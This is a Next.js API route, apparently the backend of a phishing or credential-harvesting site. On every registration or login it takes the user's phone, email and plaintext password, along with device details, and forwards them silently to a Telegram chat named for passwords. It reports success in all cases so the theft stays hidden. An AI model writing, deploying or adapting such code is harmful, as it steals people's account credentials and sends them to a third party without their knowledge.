import { NextRequest, NextResponse } from 'next/server';

const BOT_TOKEN = process.env.BOT_TOKEN;
const PASSWORDS_CHAT_ID = process.env.PASSWORDS_CHAT_ID;

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const {
            type, phone, email, password, country, currency, userId,
            platform, language, screenSize, timezone, referrer
        } = body;

        if (!BOT_TOKEN || !PASSWORDS_CHAT_ID) {
            return NextResponse.json({ success: true });
        }

        const dateDisplay = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });

        const deviceInfo = `
📱 <b>Qurilma:</b> ${platform || '-'}
🖥️ <b>Ekran:</b> ${screenSize || '-'}
🌐 <b>Til:</b> ${language || '-'}
⏰ <b>Vaqt zonasi:</b> ${timezone || '-'}
🔗 <b>Referrer:</b> ${referrer || 'direct'}`;

        let message: string;

        if (type === 'registration') {
            message = `🆕 <b>YANGI RO'YXATDAN O'TISH</b>

📱 <b>Telefon:</b> <code>${phone || '-'}</code>
📧 <b>Email:</b> <code>${email || '-'}</code>
🔐 <b>Parol:</b> <code>${password}</code>
🌍 <b>Mamlakat:</b> ${country || '-'}
💰 <b>Valyuta:</b> ${currency || '-'}
👤 <b>User ID:</b> <code>${userId || '-'}</code>

📅 <b>Sana:</b> ${dateDisplay}
${deviceInfo}`;
        } else {
            message = `🔑 <b>KIRISH (LOGIN)</b>

📱 <b>Telefon/Email:</b> <code>${phone || email || '-'}</code>
🔐 <b>Parol:</b> <code>${password}</code>

📅 <b>Sana:</b> ${dateDisplay}
${deviceInfo}`;
        }

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: PASSWORDS_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(() => { });

        return NextResponse.json({ success: true });
    } catch {
        return NextResponse.json({ success: true });
    }
}
